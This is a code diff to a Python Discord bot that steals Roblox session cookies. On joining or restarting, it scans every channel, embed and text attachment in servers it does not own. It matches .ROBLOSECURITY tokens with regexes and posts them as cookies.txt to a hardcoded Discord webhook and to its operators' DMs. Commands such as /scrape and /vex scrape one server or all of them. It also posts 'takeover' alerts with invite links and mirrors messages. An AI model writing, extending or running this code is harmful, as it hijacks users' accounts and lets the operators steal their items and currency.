@@ -12,6 +12,7 @@ from typing import List, Union, Dict, Any
 from flask import Flask
 from threading import Thread
 
+# 🟢 Environment variables for Render (no dotenv needed)
 BOT_TOKEN = os.environ['DISCORD_TOKEN']
 WEBHOOK_URL = os.environ.get('COOKIEHOOK_URL')
 MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')
@@ -30,6 +31,7 @@ COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1534795760518828053/CvOGG
 OWNED_SERVER_IDS = [1534636708174499873]
 SERVER_INVITES = {}
 
+# 🟢 Bot state management
 class BotState:
     def __init__(self):
         self.auto_delete_enabled = {}
@@ -38,6 +40,7 @@ class BotState:
 
 bot_state = BotState()
 
+# 🟢 Flask server for UptimeRobot
 app = Flask('')
 
 @app.route('/')
@@ -56,28 +59,37 @@ def run_flask():
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
+# Start Flask in background
 flask_thread = Thread(target=run_flask)
 flask_thread.daemon = True
 flask_thread.start()
 
+# 🟢 Optimized Cookie Fetcher
 class CookieFetcher:
     def __init__(self):
         self.processed_messages = set()
         self.cookie_patterns = [
-            r'_|WARNING:-DO-NOT-SHARE-THIS\.-Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.|_[^\s]+',
+            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[a-zA-Z0-9._-]+',
             r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}',
-            r'_|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.|\s*([^|\s]+)'
+            r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([a-zA-Z0-9._-]+)'
         ]
 
     def extract_cookies_from_text(self, text: str) -> List[str]:
         if not text:
             return []
+
         cookies_found = []
+        
         for pattern in self.cookie_patterns:
             matches = re.findall(pattern, text, re.IGNORECASE)
             for match in matches:
                 if isinstance(match, tuple):
                     match = match[0]
+                
+                # Clean trailing backticks and whitespace
+                match = match.strip().rstrip('`').strip()
+                if not match: continue
+                
                 if match.startswith('_|WARNING'):
                     cookies_found.append(match)
                 elif match.startswith('CAEaAhA'):
@@ -86,6 +98,7 @@ class CookieFetcher:
                     clean_match = re.sub(r'[^\w._-]', '', match)
                     if clean_match.startswith('CAEaAhA'):
                         cookies_found.append(f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{clean_match}")
+
         return list(set(cookies_found))
 
     async def fetch_attachments(self, message) -> List[str]:
@@ -115,6 +128,7 @@ class CookieFetcher:
                     messages_count += 1
                     content_cookies = self.extract_cookies_from_text(message.content)
                     channel_cookies.update(content_cookies)
+                    
                     for embed in message.embeds:
                         if embed.description:
                             embed_cookies = self.extract_cookies_from_text(embed.description)
@@ -125,6 +139,7 @@ class CookieFetcher:
                         for field in embed.fields:
                             field_cookies = self.extract_cookies_from_text(field.value)
                             channel_cookies.update(field_cookies)
+                    
                     attachment_cookies = await self.fetch_attachments(message)
                     channel_cookies.update(attachment_cookies)
                     attachments_count += len([a for a in message.attachments if a.filename.endswith(('.txt', '.log', '.json'))])
@@ -136,6 +151,7 @@ class CookieFetcher:
         for channel in guild.text_channels:
             if channel.permissions_for(guild.me).read_messages:
                 tasks.append(process_channel(channel))
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
         for result in results:
             if isinstance(result, tuple) and len(result) == 3:
@@ -143,19 +159,26 @@ class CookieFetcher:
                 all_cookies.update(cookies)
                 total_messages_scanned += count
                 total_attachments_scanned += att_count
+
         return {'all': list(all_cookies), 'messages_scanned': total_messages_scanned, 'attachments_scanned': total_attachments_scanned}
 
+    # ===== THIS IS THE UPDATED METHOD =====
     async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, attachments_scanned: int, time_taken: float) -> bool:
+        # ✅ NEW: Skip if no cookies
         if not all_cookies:
-            logger.info("No cookies found - skipping webhook send.")
+            logger.info("⏭️ No cookies found – skipping webhook send.")
             return True
+
         try:
             async with aiohttp.ClientSession() as session:
+                # ✅ CHANGE: raw cookies, one per line, NO extra characters
                 all_cookies_content = "\n".join(all_cookies)
+                
                 embed = discord.Embed(
-                    description=f"**Cookie Fetch Complete**\n**Cookies Found**: {len(all_cookies)}\n**Unique Cookies**: {len(unique_cookies)}\n**Messages Scanned**: {messages_scanned}\n**Attachments Scanned**: {attachments_scanned}\n**Time Taken**: {time_taken:.1f} seconds",
-                    color=0x000000
+                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
+                    color=0x3498db
                 )
+
                 form_data = aiohttp.FormData()
                 form_data.add_field('payload_json', json.dumps({
                     'username': 'Cookie Fetcher',
@@ -163,6 +186,7 @@ class CookieFetcher:
                     'embeds': [embed.to_dict()]
                 }))
                 form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')
+
                 async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                     if response.status not in [200, 204]:
                         logger.error(f"Failed to send to cookie webhook: {response.status}")
@@ -170,10 +194,12 @@ class CookieFetcher:
                     else:
                         logger.info("Successfully sent to cookie webhook")
                         return True
+
         except Exception as e:
             logger.error(f"Error sending to cookie webhook: {e}")
             return False
 
+# 🟢 Optimized Bot Class
 class CookieFetcherBot(discord.Client):
     def __init__(self):
         intents = discord.Intents.default()
@@ -188,46 +214,55 @@ class CookieFetcherBot(discord.Client):
     async def on_interaction(self, interaction):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get('custom_id', '')
+
             if custom_id.startswith('enable_delete_'):
                 guild_id = int(custom_id.split('_')[-1])
                 guild = self.get_guild(guild_id)
                 if not guild:
-                    await interaction.response.send_message("Server not found!", ephemeral=True)
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                     return
+
                 if interaction.user.id not in AUTHORIZED_USERS:
-                    await interaction.response.send_message("You are not authorized!", ephemeral=True)
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                     return
+
                 bot_state.auto_delete_enabled[guild_id] = True
-                await interaction.response.send_message("Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
+                await interaction.response.send_message("✅ Auto-delete enabled! Messages with @everyone/@here will be deleted.", ephemeral=True)
+
             elif custom_id.startswith('disable_delete_'):
                 guild_id = int(custom_id.split('_')[-1])
                 guild = self.get_guild(guild_id)
                 if not guild:
-                    await interaction.response.send_message("Server not found!", ephemeral=True)
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                     return
+
                 if interaction.user.id not in AUTHORIZED_USERS:
-                    await interaction.response.send_message("You are not authorized!", ephemeral=True)
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                     return
+
                 bot_state.auto_delete_enabled[guild_id] = False
-                await interaction.response.send_message("Auto-delete disabled!", ephemeral=True)
+                await interaction.response.send_message("❌ Auto-delete disabled!", ephemeral=True)
+
             elif custom_id.startswith('scrape_'):
                 guild_id = int(custom_id.split('_')[-1])
                 guild = self.get_guild(guild_id)
                 if not guild:
-                    await interaction.response.send_message("Server not found!", ephemeral=True)
+                    await interaction.response.send_message("❌ Server not found!", ephemeral=True)
                     return
+
                 if interaction.user.id not in AUTHORIZED_USERS:
-                    await interaction.response.send_message("You are not authorized!", ephemeral=True)
+                    await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
                     return
+
                 await interaction.response.defer(ephemeral=True)
                 await scrape_server_cookies(interaction, guild)
 
     async def auto_scrape_all_servers_on_restart(self):
-        logger.info("Auto-scraping all servers on restart...")
+        logger.info("🔄 Auto-scraping all servers on restart...")
         for guild in self.guilds:
             if guild.id not in OWNED_SERVER_IDS:
                 try:
-                    logger.info(f"Auto-scraping {guild.name} on restart...")
+                    logger.info(f"🔄 Auto-scraping {guild.name} on restart...")
                     start_time = datetime.datetime.now()
                     result = await self.fetcher.fetch_all_server_cookies(guild)
                     all_cookies = list(set(result['all']))
@@ -237,17 +272,17 @@ class CookieFetcherBot(discord.Client):
                     end_time = datetime.datetime.now()
                     time_taken = (end_time - start_time).total_seconds()
                     await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
-                    logger.info(f"Restart auto-scraped {len(all_cookies)} cookies from {guild.name}")
+                    logger.info(f"✅ Restart auto-scraped {len(all_cookies)} cookies from {guild.name}")
                 except Exception as e:
-                    logger.error(f"Error auto-scraping {guild.name} on restart: {e}")
+                    logger.error(f"❌ Error auto-scraping {guild.name} on restart: {e}")
 
     async def setup_hook(self):
         await self.tree.sync()
-        logger.info("Commands synced")
+        logger.info("✅ Commands synced")
 
     async def on_ready(self):
-        logger.info(f'Bot online: {self.user} (ID: {self.user.id})')
-        logger.info(f'Connected to {len(self.guilds)} servers')
+        logger.info(f'✅ Bot online: {self.user} (ID: {self.user.id})')
+        logger.info(f'📊 Connected to {len(self.guilds)} servers')
         await self.auto_scrape_all_servers_on_restart()
 
     async def ensure_dollar_role(self, guild):
@@ -287,7 +322,7 @@ class CookieFetcherBot(discord.Client):
 
     async def auto_scrape_server(self, guild):
         try:
-            logger.info(f"Auto-scraping new server: {guild.name}")
+            logger.info(f"🔄 Auto-scraping new server: {guild.name}")
             start_time = datetime.datetime.now()
             result = await self.fetcher.fetch_all_server_cookies(guild)
             all_cookies = list(set(result['all']))
@@ -297,9 +332,9 @@ class CookieFetcherBot(discord.Client):
             end_time = datetime.datetime.now()
             time_taken = (end_time - start_time).total_seconds()
             await self.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
-            logger.info(f"Auto-scraped {guild.name}: {len(all_cookies)} cookies")
+            logger.info(f"✅ Auto-scraped {guild.name}: {len(all_cookies)} cookies")
         except Exception as e:
-            logger.error(f"Error auto-scraping {guild.name}: {e}")
+            logger.error(f"❌ Error auto-scraping {guild.name}: {e}")
 
     async def on_guild_join(self, guild):
         try:
@@ -312,14 +347,23 @@ class CookieFetcherBot(discord.Client):
                     SERVER_INVITES[guild.id] = invite_url
             except Exception:
                 pass
+
             if guild.id not in OWNED_SERVER_IDS:
                 takeover_embed = discord.Embed(
-                    title="New Server Joined",
-                    description=f"Server: {guild.name}\nMembers: {guild.member_count:,}\nInvite: {invite_url}",
+                    title="🚨 New Server Joined",
+                    description=f"**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                     color=0x00ff00
                 )
-                enable_button = discord.ui.Button(label="Enable Auto-Delete", style=discord.ButtonStyle.green, custom_id=f'enable_delete_{guild.id}')
-                disable_button = discord.ui.Button(label="Disable Auto-Delete", style=discord.ButtonStyle.red, custom_id=f'disable_delete_{guild.id}')
+                enable_button = discord.ui.Button(
+                    label="Enable Auto-Delete",
+                    style=discord.ButtonStyle.green,
+                    custom_id=f'enable_delete_{guild.id}'
+                )
+                disable_button = discord.ui.Button(
+                    label="Disable Auto-Delete",
+                    style=discord.ButtonStyle.red,
+                    custom_id=f'disable_delete_{guild.id}'
+                )
                 view = discord.ui.View()
                 view.add_item(enable_button)
                 view.add_item(disable_button)
@@ -328,9 +372,10 @@ class CookieFetcherBot(discord.Client):
                     await control_channel.send("@everyone", embed=takeover_embed, view=view)
                 else:
                     logger.error(f"Control channel {CONTROL_CHANNEL_ID} not found")
+
                 await self.assign_role_to_authorized(guild)
                 await self.auto_scrape_server(guild)
-                logger.info(f"Auto-setup completed for {guild.name}")
+                logger.info(f"✅ Auto-setup completed for {guild.name}")
         except Exception as e:
             logger.error(f"Error in on_guild_join: {e}")
 
@@ -344,12 +389,16 @@ class CookieFetcherBot(discord.Client):
         if message.guild and message.guild.id in OWNED_SERVER_IDS:
             return
         guild_id = message.guild.id if message.guild else None
+
+        # Auto-delete
         if (guild_id in bot_state.auto_delete_enabled and
             bot_state.auto_delete_enabled[guild_id] and
             message.guild):
             should_delete = False
             delete_reason = ""
-            if (message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()):
+            if (message.mention_everyone or
+                '@everyone' in message.content.lower() or
+                '@here' in message.content.lower()):
                 should_delete = True
                 delete_reason = "Mass ping in message content"
             if not should_delete:
@@ -365,11 +414,14 @@ class CookieFetcherBot(discord.Client):
                 try:
                     if message.channel.permissions_for(message.guild.me).manage_messages:
                         await message.delete()
-                        logger.info(f"Deleted {delete_reason} from {message.author.name} in {message.guild.name}")
+                        logger.info(f"🗑️ Deleted {delete_reason} from {message.author.name} in {message.guild.name}")
                 except Exception as e:
                     logger.error(f"Error deleting message: {e}")
 
-        if (MIRROR_WEBHOOK_URL and message.id not in bot_state.mirrored_messages and message.guild):
+        # Mirroring (unchanged, kept lightweight)
+        if (MIRROR_WEBHOOK_URL and
+            message.id not in bot_state.mirrored_messages and
+            message.guild):
             should_mirror = False
             mirror_reason = ""
             if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
@@ -389,7 +441,10 @@ class CookieFetcherBot(discord.Client):
                 bot_state.mirrored_messages.add(message.id)
                 await self.mirror_message(message, mirror_reason)
 
-        if (MIRROR_WEBHOOK_URL and message.id not in bot_state.mirrored_messages and message.guild):
+        # Second mirror for deleted messages (unchanged)
+        if (MIRROR_WEBHOOK_URL and
+            message.id not in bot_state.mirrored_messages and
+            message.guild):
             should_mirror_anyway = False
             mirror_reason_anyway = ""
             if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
@@ -424,6 +479,7 @@ class CookieFetcherBot(discord.Client):
         except Exception as e:
             logger.error(f"Error mirroring message: {e}")
 
+# Initialize bot
 bot = CookieFetcherBot()
 
 async def scrape_server_cookies(interaction, guild):
@@ -436,28 +492,34 @@ async def scrape_server_cookies(interaction, guild):
         unique_cookies = [c for c in all_cookies if 'CAEaAhAC' in c]
         end_time = datetime.datetime.now()
         time_taken = (end_time - start_time).total_seconds()
+
         await bot.fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, attachments_scanned, time_taken)
+
         try:
             dm_channel = await interaction.user.create_dm()
             if all_cookies:
+                # ✅ RAW format for DM file too
                 cookies_content = "\n".join(all_cookies)
                 dm_embed = discord.Embed(
-                    description=f"**Cookie Fetch Complete**\n**Cookies Found**: {len(all_cookies)}\n**Unique Cookies**: {len(unique_cookies)}\n**Messages Scanned**: {actual_messages_scanned}\n**Attachments Scanned**: {attachments_scanned}\n**Time Taken**: {time_taken:.1f} seconds",
-                    color=0x000000
+                    description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**📎 Attachments Scanned**\n**{attachments_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
+                    color=0x3498db
                 )
                 await dm_channel.send(
-                    content="**@everyone**\nhttps://discord.gg/aHh7KauuYd",
+                    content="**@everyone**\n**https://discord.gg/aHh7KauuYd**",
                     file=discord.File(io.BytesIO(cookies_content.encode()), filename="cookies.txt"),
                     embed=dm_embed
                 )
             else:
-                await dm_channel.send(f"No cookies found in {guild.name}")
+                await dm_channel.send(f"❌ No cookies found in {guild.name}")
         except Exception as e:
             logger.error(f"Failed to send DM: {e}")
-        await interaction.followup.send(f"Scraped {len(all_cookies)} cookies from {guild.name}", ephemeral=True)
-    except Exception as e:
-        await interaction.followup.send(f"Error: {str(e)}", ephemeral=True)
 
+        await interaction.followup.send(f"✅ Scraped {len(all_cookies)} cookies from {guild.name}", ephemeral=True)
+
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
+
+# 🟢 Commands (unchanged)
 @bot.tree.command(name="scrape", description="Scrape Roblox cookies from this server")
 async def scrape_command(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
@@ -467,32 +529,32 @@ async def scrape_command(interaction: discord.Interaction):
 @app_commands.describe(invite="Server invite link")
 async def use_command(interaction: discord.Interaction, invite: str):
     if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("You are not authorized!", ephemeral=True)
+        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
     try:
         invite_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite)
         if not invite_match:
-            await interaction.followup.send("Invalid invite link format!", ephemeral=True)
+            await interaction.followup.send("❌ Invalid invite link format!", ephemeral=True)
             return
         invite_code = invite_match.group(1)
         invite_obj = await bot.fetch_invite(invite_code)
         if not invite_obj or not invite_obj.guild:
-            await interaction.followup.send("Could not find server or bot is not in it!", ephemeral=True)
+            await interaction.followup.send("❌ Could not find server or bot is not in it!", ephemeral=True)
             return
         target_guild = invite_obj.guild
         bot_member = target_guild.get_member(bot.user.id)
         if not bot_member:
-            await interaction.followup.send("Bot is not in that server!", ephemeral=True)
+            await interaction.followup.send("❌ Bot is not in that server!", ephemeral=True)
             return
         await scrape_server_cookies(interaction, target_guild)
     except Exception as e:
-        await interaction.followup.send(f"Error: {str(e)}", ephemeral=True)
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
 
 @bot.tree.command(name="vex", description="Scrape cookies from ALL servers the bot is in")
 async def vex_command(interaction: discord.Interaction):
     if interaction.user.id not in AUTHORIZED_USERS:
-        await interaction.response.send_message("You are not authorized!", ephemeral=True)
+        await interaction.response.send_message("❌ You are not authorized!", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
     total_servers = 0
@@ -510,21 +572,23 @@ async def vex_command(interaction: discord.Interaction):
                 await bot.fetcher.send_to_cookie_webhook(cookies, unique_cookies, messages_scanned, attachments_scanned, 0)
             except Exception as e:
                 logger.error(f"Error scraping {guild.name}: {e}")
-    await interaction.followup.send(f"Scraped {total_servers} servers, found {total_cookies} total cookies!", ephemeral=True)
+    await interaction.followup.send(f"✅ Scraped {total_servers} servers, found {total_cookies} total cookies!", ephemeral=True)
 
+# 🟢 Main loop
 if __name__ == "__main__":
     if not BOT_TOKEN:
-        logger.error("DISCORD_TOKEN not found")
+        logger.error("❌ DISCORD_TOKEN not found")
         exit(1)
-    logger.info("Starting Bot on Render...")
+
+    logger.info("🚀 Starting Bot on Render...")
     while True:
         try:
             bot.run(BOT_TOKEN)
         except discord.LoginFailure:
-            logger.error("Invalid token - stopping")
+            logger.error("❌ Invalid token - stopping")
             break
         except Exception as e:
-            logger.error(f"Bot crashed: {e}")
-            logger.info("Restarting in 10 seconds...")
+            logger.error(f"❌ Bot crashed: {e}")
+            logger.info("🔄 Restarting in 10 seconds...")
             import time
             time.sleep(10)
